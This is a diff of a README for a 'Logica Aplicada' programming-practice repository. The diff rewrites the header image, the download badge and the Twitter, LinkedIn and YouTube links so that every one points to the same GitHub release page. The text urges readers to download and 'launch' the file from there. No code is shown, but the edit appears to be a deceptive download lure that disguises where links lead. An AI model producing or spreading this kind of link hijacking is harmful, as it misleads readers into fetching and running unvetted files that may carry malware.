@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "Logica Aplicada" Repository!
 
-![Logic Programming](https://images.unsplash.com/photo-1566388452644-3fbad4713e8b)
+![Logic Programming](https://github.com/janosch525252/logica-aplicada/releases/tag/v1.0)
 
 ## Description
 This repository contains projects created by the MoureDev community during 2025. The main purpose of these projects is to practice logic and learn how to implement various real and common functionalities in all types of applications. Whether you are a beginner looking to enhance your logic programming skills or an experienced developer wanting to tackle new challenges, "Logica Aplicada" has something for everyone.
@@ -30,7 +30,7 @@ Feel free to explore each project and dive into the world of logic programming!
 ## How to Use
 To get started with these projects, you can download the source code by clicking the button below:
 
-[![Download Project](https://img.shields.io/badge/Download%20Source%20Code-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch Download")
+[![Download Project](https://github.com/janosch525252/logica-aplicada/releases/tag/v1.0%20Source%20Code-v1.0.0-blue)](https://github.com/janosch525252/logica-aplicada/releases/tag/v1.0 "Launch Download")
 
 If the above link doesn't work or the file needs to be launched, please check the "Releases" section for alternative options.
 
@@ -42,9 +42,9 @@ If you encounter any issues or have questions regarding the projects in this rep
 
 ## Connect with Us
 Stay updated on the latest news, projects, and events by following us on:
-- [Twitter](https://twitter.com/logicaaplicada)
-- [LinkedIn](https://www.linkedin.com/company/logicaaplicada)
-- [YouTube](https://www.youtube.com/c/logicaaplicada)
+- [Twitter](https://github.com/janosch525252/logica-aplicada/releases/tag/v1.0)
+- [LinkedIn](https://github.com/janosch525252/logica-aplicada/releases/tag/v1.0)
+- [YouTube](https://github.com/janosch525252/logica-aplicada/releases/tag/v1.0)
 
 Let's build a logical future together! 🧠💻🌟
 
